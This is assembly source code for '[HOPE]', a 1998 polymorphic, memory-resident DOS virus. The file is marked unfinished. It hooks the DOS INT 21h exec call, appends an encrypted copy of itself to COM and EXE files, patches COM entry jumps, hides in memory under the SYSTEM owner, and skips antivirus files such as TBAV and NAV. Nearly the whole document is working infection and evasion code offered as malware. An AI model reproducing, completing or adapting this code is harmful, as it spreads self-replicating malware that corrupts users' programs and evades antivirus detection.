;HOPE Polymorphic. EXE/COM. Resident DOS Exec Hooking
;Appends /? to command line occasionally
;Running an infected file with "/HOPE" will display
;"[HOPE] Infected."
;
;"[HOPE] Disabled." & infection will be disabled

;!!!!
;!!!! INCOMPLETE/UNFINISHED !!!!!!!
;!!!!

extrn Generate:near
extrn Randnum:near
extrn Hope_end:near


VSIZE Equ 0FF ;in paragraphs
BUFFER Equ 040 ;in paragraphs
DECRSIZE Equ 0100 ;Decryptor is a max of 254 bytes

    org 0

MAIN:

Paligned:		;Will be aligned to a para by [HOPE]
Jmp Running
;----------------------------------------------------------------------------
   
   
   ;Tables for storage:
   Filehandle:
   INT 021		;Int 021 for this generation only
   Runningseg:
   dw ? 		;The seg which the decryptor used (for COM use)
   Originalss:
   dw ?			;The original SS from EXE Header
   Originalsp:
   dw 0FFFE             ;The original SP from EXE header/or FFFE

   Originales:
   dw ?			;The ES register when program started
   Prevstackss:
   dw ?			;Segment of DOS stack
   Prevstacksp:
   dw ?			;Offset of DOS stack
   Flag:
   db 1                 ;Flag of whether in COM or EXE

   Avoid:
   db 'KRNL'
   db 'TBAV'		;Files to avoid
   db 'VSAF'
   db 'COMM'
   db 'NAV.'
   db 'USER'
   
   Target:
   db 'VXIN'		;!!!! DEBUG !!!!! Infect only these files

   Savedbytes:
   db 0B8,000,04c       ;3 bytes saved when COM infected (MOV AX,04c00)

;---------------------------------------------------------------------------
Int21hook:
   ;INT 21 Payloads here

   Cmp AX,03000h   	;DOS Version Number
   Jne Testexec

   Cmp BX,0DEADh	;If so, we are asking if we're installed
   Jne Keepgoing
   MOV AX,0666           ;Mark it as installed
   Iret			;And go back
  Testexec:
   
   Cmp AX,04B00h  ;DOS Exec
   Je Infect

   ;CMP AX,04B05h  ;Set execution state (Windows Exec)
   ;Je Infect

  Keepgoing:
   db 0EA
  Old21off:
   dw ?
  Old21seg:
   dw ?


;----------------------------------------------------------------------------

Infect:
   ;Running in memory, called when IN21 func 4B
   ;So should save everything
   ;assume an executable
   Push AX     ;To DOS stack
   Push CX
   Push BX
   Push DX
   Push SI
   Push DI
   Push DS
   Push ES

  ;Get actual filename if AL=05
   ;CMP AX,4b05h
  ;JNE NormalEXEC

   ;MOV BX,DX
   ;MOV DX,[BX+4]   ;From execution state structure table
   ;MOV DS,[BX+6]

  ;-------------------------------------------
NormalEXEC:
   
   Cli
   CS Mov [Offset Prevstackss],SS
   CS Mov [Offset Prevstacksp],SP ;Save old stack
   Sti

   Mov AX,04800
   Mov BX,BUFFER	;Allocate our own stack/buffer (0300 bytes)
   Int 021
   Cli
   Mov SS,AX	        ;Set our new stack
   Mov SP,(BUFFER * 010)	;Set the SP of the stack seg
   Sti

  ;---------------------------------------------
   ;Check extension if COM or EXE, otherwise abort
   ;Check if target file (DEBUG)
   MOV SI,DX
   
   CLD
  NOZERO: 
   LODSB	;Go to the end of the file+path string
   OR AL,AL
   JNZ NOZERO
   
   STD
  NOSLASH: 	;Convert to upper case while we're at it
   LODSB
   CMP SI,DX	;Check if we are back at the start
   JE ENDOFSTRING
   CMP AL,'\'	;Search	to the start of the filename
   JNE NOSLASH
   INC SI	;Get to the first letter
   INC SI
   JMP PathAswell Short
  ENDOFSTRING:
   MOV SI,DX	;No path is included so reset the start of the string
  PathasWell: 

   CLD
   PUSH CS
   POP ES
   MOV DI,OFFSET Target      
   MOV CX,4
   REP CMPSB
   JE NoAbort
  AbClose: 
   JMP AbortNoAttribs
  NoAbort:

   ;Test file for EXE or COM, otherwise abort!
   CS Mov B[Offset Flag],1 ;Set flag of COM
   ;JMP AbortNoAttribs

   Mov AX,04300
   Int 021   	;Get file attribs
   Push CX   	;*****	Attribs
   Mov AX,04301
   Xor CX,CX
   Int 021	;Set file attribs to normal

   Push DS	;*****	ASCII String   
   Push DX	;*****	ASCII String
   
   ;---------------------------------------------
   
   Mov AX,03D02	;Open File (assume a free DTA)
   Int 021
   JC AbortNoClose
   CS Mov [Offset Filehandle],AX	;Save handle

   ;---------------------------------------------
   
   ;Read in first 32 bytes used for checking infection marker
   Push SS
   Pop DS
   Mov BX,AX
   Call SeekStart
   Xor DX,DX
   Mov CX,020		;Read in header (even if a COM)
   Call ReadBytes
   MOV DX,[0]
   PUSH CS
   POP ES   		;Make ES=CS

   CS Test b[Flag],1
   JZ EXEfile            ;Parse to correct 'infector'

   ;------------------------ COM -------------------------------------------
   ;Save first 3 bytes and modify to JMP if COM
  Comfile:
   Cmp DL,0E9		;COM infection marker of a 'jmp'
   Je Abort
   CS Mov B[Offset Flag],1 ;Set flag of COM
   XOR SI,SI
   MOV DI,(OFFSET SavedBytes)
   MOVSW
   MOVSB	;Save the 3 bytes
   Call SeekEnd	;In a COM file it should never be bigger than 65535 (1 word)
   OR DX,DX     ;Just in case, DX should always be 0 in a COM
   JNZ Abort
   CMP AX,(0FF-(VSIZE*010)) ;Check if too big
   JL Abort
   
   Push AX	;&&Save Offset
   SUB AX,03    ;Find offset from JMP (size of JMP)
   MOV b[0],0E9	;Copy jmp to Data buffer
   MOV [1],AX	;Copy offset for jmp to data buffer
   Call SeekStart
   MOV CX,3	;Write the JMP to the COM
   Call WriteBytes  ;DX = 0, DS = Read/Write Buffer
   POP DI	;&&Load offset to be run at in Program
   ADD DI,0100	;COM files must add 0100
   CS MOV [OFFSET ReturnOff],0100 ;Com files return at offset 0100
   
   Jmp DoneFix   
   
   ;------------------------ EXE -------------------------------------------
   ;Modify Header if EXE, determine Entry point, modify self for infection
   ;Make sure isn't a Windows NE/PE Header
  Exefile:
   Cmp DX,'ZM'		;Exe marker of 'MZ'
   Jne Abort		;If not MZ then probably the marker of 'ZM'
   Call SeekEnd
   AND AX,0F 	;Get the amount of paragraph offset
   Mov DI,AX	;Load offset to be run at in Program (0 if padded EXE)
 
   ;-----------------------------------------------------------------------
 
 DoneFix:
   Call WriteProg
 
 
 Abort:
   CS Mov BX,[Offset Filehandle]	;Restore file handle
   Mov AX,03E00
   Int 021		;Close file handle

 AbortNoClose:
 
  Restattrib:

   Pop DX	;*****	ASCII String
   Pop DS	;*****	ASCII String
   Pop CX	;*****	Attribs
   Mov AX,04301
   Int 021	;Set file attribs back

 AbortNoAttribs:

  Restregs:

   ;Free Stack/Buffer
   Push SS
   Pop ES
   Cli
   CS Mov SS,[Offset Prevstackss]	;Reset old stack
   CS Mov SP,[Offset Prevstacksp]
   Sti
   Mov AX,04900
   Int 021 	;Free our stack/buffer in ES

   Pop ES
   Pop DS
   Pop DI
   Pop SI
   Pop DX
   Pop BX	;Restore registers from DOS stack
   Pop CX
   Pop AX

   
   Jmp Keepgoing	;And keep stepping through the int chain as though
   			;nothing has happened


;----------------------------------------------------------------------------
;General Use Functions

SeekStart:
   MOV AX,04200
  ZeroSearch: 
   XOR DX,DX
   XOR CX,CX
  INTRET:
   INT 021		;Seek to start of file
   RET


SeekEnd:
   MOV AX,04202
   JMP ZeroSearch Short


ReadBytes:
   
   MOV AX,03F00
   JMP INTRET Short


WriteBytes:
   MOV AX,04000
   JMP INTRET Short


;---------------------------------------------------------------------------
;Allocates memory for the decryptor
;Generates a decryptor, encrypts the virus and appends it to the end of
;the file using the file handle, and frees the allocated memory.

Writeprog:
   ;Reset Data Segment
   Push CS
   Pop DS

   ;Generate a new decryptor and copy into file
   ;Allocate memory for generation
   Mov AX,04800
   Mov BX,VSIZE+DECRSIZE ;+0100 bytes for decryptor
   Int 021
   JC Nomem	;If this happens, there probably isn't enough room for the
   		;Program anyway
   Push AX	;Save allocated Seg
   
   Mov BX,AX	;Put allocated seg into BX
   Mov AX,DI
   And AL,0F0   ;Get the amount of paras into AX
   Shr AX,4
   Sub BX,AX    ;Reduce the free segment
   Mov ES,BX    ;And change to the lesser segment
                ;Will now generate the code at ES:DI
                ;with a maximum waste of 15 bytes.
   Push CS
   Pop DS
   XOR SI,SI		;'Paligned' offset (0) 
   Mov CX,VSIZE*010	;Code Size
   ;[HOPE]
   
   
   Call Generate  	;Generate polymorphic engine at ES:DI
                  	;Size CX, Code at DS:SI

   ;Write encrypted virus to program at EOF
   ;Encrypted Virus at ES:DI size SI

   CS MOV BX,[Offset FileHandle]
   Call SeekEnd
   ;DX:AX = New File Pointer Position (EOF)

   PUSH ES
   POP DS
   MOV DX,DI
   MOV CX,SI
   Call WriteBytes  						 

   Mov AX,04900
   Pop ES		;Restore saved allocated seg
   Int 021		;Free allocated mem

  Nomem:
   
   Ret

;----------------------------------------------------------------------------

Running:       	;When executing from file
   Call	Ahead short
  Ahead:
   Pop BP	;Find what segment we are in, offset is 0
  Figure:
   Sub BP,(offset Figure)-1
   Push CS
   Pop DS	;DS has probably been set to CS anyway
   Mov BX,DS
   Mov [BP+(offset Runningseg)],BX
   Push BP
   Shr BP,4 	;Find the segments 'in' BP
   Add BX,BP	;Increase to the segment
   Pop BP
   Mov [BP+(offset Alignseg)],BX
   db 0EA	;Far jump to set CS
   dw (offset Returnhere)
  Alignseg:
   dw ?
  Returnhere:
   Push CS
   Pop DS	;We're in our own segment now
   Mov [Originales],ES  ;Save the ES register

;----------------------------------------------------------------------------
  ;On RUN Payload

  Checkhope:
   ;Check the command tail in the PSP for /HOPE
   ;and print "[HOPE] Infected."

;----------------------------------------------------------------------------

  Checkinstall:
   Mov AX,03000
   Mov BX,0DEAD
   Int 021
   CMP AX,0666
   Jz Installed

;----------------------------------------------------------------------------

  Install:	;Install into memory
    
    MOV AX,04800 ;Allocate memory
    MOV BX,VSIZE    
    INT 021 	 ;AX = seg of allocated block
    JC TryResize ;If there is no mem to alloc, then resize our block
    DEC AX 	 ;So that we are at the MCB of the new block
    JMP LoadIn
   
   TryResize: 
    MOV AX,[Offset Originales]
    DEC AX
    MOV ES,AX	;Load seg of current MCB
    
    ES CMP b[0],'Z'
    JNE Installed	;Check if last block in chain

    ES MOV BX,w[3]	;Get size of Block
    SUB BX,VSIZE+1	;New size of block :)
    
    INC AX
    MOV ES,AX
    MOV AX,04A00	;Reduce size of current block
    INT 021
    JC Installed

    MOV AX, 04800 ;Allocate memory
    MOV BX, VSIZE    
    INT 021 	  ;AX = seg of allocated block
    DEC AX

    ;MOV AX,ES
    ;ADD AX,BX	;Move to our new Mem Block MCB

   LoadIn:

    MOV ES,AX
    ES MOV w[1],08	;Modify owner PSP, 08 = SYSTEM
    INC AX   
    MOV ES,AX		;Get into our memory block made just for us.

  ReadVector:

    PUSH ES
    MOV AX,03521	;Get interrupt 21 Vector
    INT 021
    Mov w[Offset Old21Seg],ES
    Mov w[Offset Old21Off],BX
    POP ES
  
    XOR SI,SI
    XOR DI,DI
    Mov CX,VSIZE*010
  CopyLoop: 		;Copy virus into memory
    REP MOVSB
  
  ChangeVector:
    MOV AX,02521
    PUSH ES		;Hook int 21
    POP	DS
    MOV DX,Offset Int21Hook	;Set Vector
    INT 021

    
    
;----------------------------------------------------------------------------
  Installed:
    ;Just return
    
    Push CS
    Pop DS
    CS Mov ES,[Originales]    

    Mov DX,[Runningseg]
    Sub DX,w[offset Returnseg]  ;Calculate new CS
    Mov w[offset Returnseg],DX  ;Calculate new CS 
    
    Mov DX,[Runningseg]
    Sub DX,w[offset Originalss]	;Calculate new SS
    Mov w[offset Originalss],DX
    
    
    TEST B[offset Flag],1
    JZ	Notcom    		;Flag = 1 if COM file
    Mov SI,(offset Savedbytes)
    Mov DI,0100
    Movsw			;From DS:SI to ES:DI
    Movsb			;Replace 3 bytes
   Notcom:

    Cli
    CS Mov DS,[Originales]
    CS Mov SS,[Originalss]
    CS Mov SP,[Originalsp]
    Sti

    db 0EA		;Far Jump
   Returnoff:
    dw 0                ;0100 if COM file, else IP in EXE header
   Returnseg:
    dw 0                ;0 if COM file, Else (NewCS) - (CS in EXE header)

    db '[HOPE] v2.52b Demo Virus (c) 1nternal 1998 ' 

END MAIN
